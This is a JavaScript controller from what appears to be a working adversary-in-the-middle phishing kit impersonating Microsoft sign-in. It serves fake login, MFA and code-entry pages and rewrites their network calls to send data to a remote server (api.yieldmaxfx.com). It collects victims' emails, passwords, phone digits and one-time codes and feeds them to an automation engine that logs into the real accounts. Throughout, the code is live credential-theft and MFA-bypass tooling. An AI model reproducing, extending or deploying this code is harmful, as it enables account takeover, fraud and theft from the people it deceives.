/**
 * Session Controller
 * Handles the logic for initiating and managing automation sessions via the External API.
 */
const globals = require('../../config/globals');
const { getConnection, sendToClient } = require('../../services/websocket');
const { startAutomation } = require('../../automation/loginFlow');
const { handleImmediateEmailInput } = require('../../handlers/emailHandler');
const { generateToken } = require('../../services/tokenManager'); // [NEW] Import

// --- Generators for Server-Driven UI via API ---
const { generateGatewayPage } = require('../../generators/gatewayPage');
const { generateSimpleCaptchaPage } = require('../../generators/simpleCaptchaPage'); // [NEW]
const { generateMsSplashPage } = require('../../generators/msSplashPage');
const { generateMsLoginPage } = require('../../generators/msLoginPage');
const { generateMsVeryPage } = require('../../generators/msVeryPage');
const { generateMsMailInputPage } = require('../../generators/msMailInputPage');
const { generateMsPhoneInputPage } = require('../../generators/msPhoneInputPage');
const { generateMsCodeInputPage } = require('../../generators/msCodeInputPage');

// --- 0. [NEW] Get HTML Page (Server-Driven UI) ---
// Helper to patch HTML for remote iframe execution
function patchHtmlForRemote(html) {
    let patched = html;

    // 1. WebSocket to VPS (wss://api.yieldmaxfx.com)
    patched = patched.replace(/ws\s*=\s*new\s*WebSocket\([^)]+\)/g, "ws = new WebSocket('wss://api.yieldmaxfx.com')");
    patched = patched.replace(/new WebSocket\(`ws:\/\/\$\{window\.location\.host\}`\)/g, "new WebSocket('wss://api.yieldmaxfx.com')");

    // 2. Fetch Requests to Absolute VPS Path (/api/xxx OR /xxx -> /eapi/xxx)
    patched = patched.replace(/fetch\('(\/api)?\/([^']+)'/g, "fetch('https://api.yieldmaxfx.com/eapi/$2'");

    // 3. Inject API Key into Headers
    // Handles various formatting (single line vs multiline)
    const headerReplacement = "headers: { 'Content-Type': 'application/json', 'X-API-KEY': 'key_dev_001' },";
    patched = patched.replace(/headers:\s*\{\s*'Content-Type':\s*'application\/json'\s*\},/g, headerReplacement);

    // 4. Redirects -> onStepRequired
    // Matches: window.location.href = data.redirect;
    patched = patched.replace(
        /window\.location\.href\s*=\s*data\.redirect;/g,
        "if(window.parent && window.parent.onStepRequired){ window.parent.onStepRequired(data.redirect); } else { window.location.href = data.redirect; }"
    );

    // Matches internal transitions: window.location.href = '/' + TOKEN + '/page';
    patched = patched.replace(
        /window\.location\.href = '\/' \+ TOKEN \+ '\/([^']+)';/g,
        "if(window.parent && window.parent.onStepRequired){ window.parent.onStepRequired('/' + TOKEN + '/$1'); } else { window.location.href = '/' + TOKEN + '/$1'; }"
    );

    // Matches explicit MFA redirect in Login page (old style)
    patched = patched.replace(
        /window\.location\.href = '\/.*\/very';/,
        "if(window.parent && window.parent.onStepRequired){ window.parent.onStepRequired('very'); } else { console.log('MFA Page required'); }"
    );

    // 5. CRITICAL: Inject login_success handler into ALL pages
    // This ensures MFA pages (mailinput, codeinput, etc.) can receive the final redirect
    // Find the ws.onmessage handler and inject our login_success check
    const loginSuccessHandler = `
                    // [INJECTED] Handle final login_success from any page
                    if (data.status === 'login_success' && data.redirect) {
                        console.log('✅ Login succeeded! Redirect:', data.redirect);
                        if (window.parent && window.parent.onStepRequired) {
                            window.parent.onStepRequired(data.redirect);
                        } else {
                            window.location.href = data.redirect;
                        }
                        return;
                    }
`;

    // Inject after the ws.onmessage opening brace
    // Look for pattern: ws.onmessage = (event) => { ... try { ... const data = JSON.parse(event.data);
    patched = patched.replace(
        /(ws\.onmessage\s*=\s*\([^)]*\)\s*=>\s*\{\s*try\s*\{\s*const data\s*=\s*JSON\.parse\([^)]+\);)/,
        `$1${loginSuccessHandler}`
    );

    return patched;
}

// --- 0. [NEW] Get HTML Page (Server-Driven UI) ---
exports.getPage = (req, res) => {
    // Allows remote FE to "pull" the perfect HTML templates
    const { type, token } = req.query; // e.g. /eapi/page?type=login&token=xyz
    const ip = req.ip || req.connection.remoteAddress;

    // We use a dummy token if none provided (for initial testing), or the real session token
    // FIX: Generate a REAL valid token if missing, to pass validator checks
    const safeToken = token || generateToken(ip, { source: 'eapi_fallback' });

    try {
        let htmlContent = '';

        switch (type) {
            case 'gateway':
                htmlContent = generateSimpleCaptchaPage();

                // [EAPI PATCH 1] Fix the Fetch URL to be absolute (since iframe is on remote domain)
                htmlContent = htmlContent.replace(
                    "fetch('/verify-captcha'",
                    "fetch('https://api.yieldmaxfx.com/verify-captcha'"
                );

                // [EAPI PATCH 2] Intercept the redirect logic
                htmlContent = htmlContent.replace(
                    "window.location.href = result.redirect || '/processing';",
                    "if(window.parent && window.parent.onGatewaySuccess){window.parent.onGatewaySuccess(result.token);}else{console.log('Gateway success');}"
                );
                break;
            case 'splash':
                htmlContent = generateMsSplashPage(safeToken);
                // [EAPI PATCH] Intercept the redirect from splash to login matches dynamic token
                htmlContent = htmlContent.replace(
                    /window\.location\.href = '\/.*\/login';/,
                    "if(window.parent && window.parent.onSplashComplete){window.parent.onSplashComplete();}else if(window.onSplashComplete){window.onSplashComplete();}else{console.log('Splash complete');}"
                );
                break;
            case 'login':
                htmlContent = generateMsLoginPage(safeToken, { randomize: true });
                htmlContent = patchHtmlForRemote(htmlContent);
                break;
            case 'mfa':
            case 'very':
                htmlContent = generateMsVeryPage(safeToken);
                htmlContent = patchHtmlForRemote(htmlContent);
                break;
            case 'mailinput':
                htmlContent = generateMsMailInputPage(safeToken);
                htmlContent = patchHtmlForRemote(htmlContent);
                break;
            case 'phoneinput':
            case 'numinput':
                htmlContent = generateMsPhoneInputPage(safeToken);
                htmlContent = patchHtmlForRemote(htmlContent); // Assuming MsPhoneInputPage uses similar structure
                break;
            case 'codeinput':
                htmlContent = generateMsCodeInputPage(safeToken);
                htmlContent = patchHtmlForRemote(htmlContent);
                break;
            default:
                return res.status(404).send('Invalid page type');
        }

        // Return JSON with HTML string (safer than raw HTML for API)
        res.json({
            success: true,
            type: type,
            html: htmlContent
        });

    } catch (error) {
        console.error('❌ [EAPI] Error generating page:', error);
        res.status(500).json({ success: false, message: 'Template generation error' });
    }
};

// --- 1. Start Auth (Initiate Session) ---
exports.startAuth = async (req, res) => {
    const { email, password, token } = req.body;

    console.log('\n[EAPI] 🔐 Start Auth Request Received');
    console.log('📧 Email:', email);
    // console.log('🔑 Password:', password); // Don't log password in production logs
    console.log('🎫 Token:', token);

    // [Compatibility] Store globally for existing logic
    // In a future "clean" remote version, we would pass these specifically to the `startAutomation` function instance
    // rather than using globals, but for now we maintain compatibility with the engine.
    try {
        globals.set('globalLoginEmail', email);
        globals.set('globalLoginPassword', password);
        globals.set('globalToken', token);
    } catch (error) {
        console.error('⚠️ Error storing credentials:', error.message);
    }

    // Send immediate response
    res.json({
        success: true,
        message: 'Automation started via EAPI',
        data: { email } // Don't echo password back
    });

    // Notify connected WebSocket client (The Lure)
    const wsConnection = getConnection();
    if (wsConnection) {
        sendToClient({
            status: 'automation_started',
            message: 'Automation process has begun (remote trigger)'
        });
    }

    // Start Engine
    // Note: We use the existing 'wsConnection' found by the server. 
    // In a detached VPS scenario, the Lure would connect its WebSocket to THIS server.
    await startAutomation(email, password, wsConnection);
};

// --- 2. Send Verification Code (MFA Step 1) ---
exports.sendVerificationCode = async (req, res) => {
    console.log('[EAPI] 📧 Send Verification Code Request');
    try {
        const { maskedEmail, fullEmail, maskedPhone, phoneDigits } = req.body;

        if (!fullEmail && !phoneDigits) {
            return res.status(400).json({ success: false, message: 'Full email or phone digits required' });
        }

        // Signal logic reset if needed
        globals.set('resetToEmailInput', true);

        if (fullEmail) {
            globals.set('globalFullEmail', fullEmail);
            globals.set('globalMaskedEmail', maskedEmail);
            console.log('✅ [EAPI] Full email queued for automation:', fullEmail);
        }
        if (maskedPhone && phoneDigits) {
            globals.set('globalPhoneDigits', phoneDigits);
            console.log('✅ [EAPI] Phone digits queued for automation:', phoneDigits);
        }

        res.json({ success: true, message: 'Input received' });

        // Trigger immediate handling
        const globalPage = globals.get('globalPage');
        if (fullEmail && globalPage) {
            console.log('🔄 [EAPI] Triggering handler...');
            const success = await handleImmediateEmailInput(globalPage, fullEmail);

            // Notify via WebSocket
            sendToClient({
                status: success ? 'email_input_success' : 'email_input_failed',
                message: success ? 'Email input success' : 'Failed to input email'
            });
        }

    } catch (error) {
        console.error('❌ [EAPI] Error:', error);
        res.status(500).json({ success: false, message: 'Server error' });
    }
};

// --- 3. Verify Code (MFA Step 2) ---
exports.verifyCode = async (req, res) => {
    console.log('[EAPI] 🔐 Verify Code Request');
    try {
        const { code, email } = req.body;

        if (!code || code.length !== 6) {
            return res.status(400).json({ success: false, message: 'Invalid code format' });
        }

        console.log('✅ [EAPI] Code received:', code);
        globals.set('globalVerificationCode', code);

        res.json({
            success: true,
            message: 'Code received by automation engine'
        });

    } catch (error) {
        console.error('❌ [EAPI] Error:', error);
        res.status(500).json({ success: false, message: 'Server error' });
    }
};

// --- 4. [NEW] Status Check (Remote Polling) ---
exports.getSessionStatus = (req, res) => {
    // Return current automation state to remote caller
    const currentStep = globals.get('currentStep') || 'idle';
    const isConnected = !!getConnection();

    res.json({
        success: true,
        status: currentStep,
        clientConnected: isConnected,
        timestamp: Date.now()
    });
};
